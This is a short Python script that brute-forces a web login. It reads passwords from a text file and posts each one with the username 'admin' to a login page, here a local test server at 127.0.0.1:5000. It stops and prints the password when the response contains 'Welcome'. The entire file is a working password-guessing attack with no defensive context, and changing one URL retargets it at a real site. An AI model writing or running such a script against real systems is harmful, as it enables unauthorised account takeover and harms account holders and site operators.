import requests

url = "http://127.0.0.1:5000/login"
username = "admin"

# Read password list from text file
with open("passwords.txt", "r") as file:
    passwords = [line.strip() for line in file]

for pw in passwords:
    data = {'username': username, 'password': pw}
    res = requests.post(url, data=data)

    if "Welcome" in res.text:
        print(f"[+] Login successful! Password: {pw}")
        break
    else:
        print(f"[-] Failed attempt: {pw}")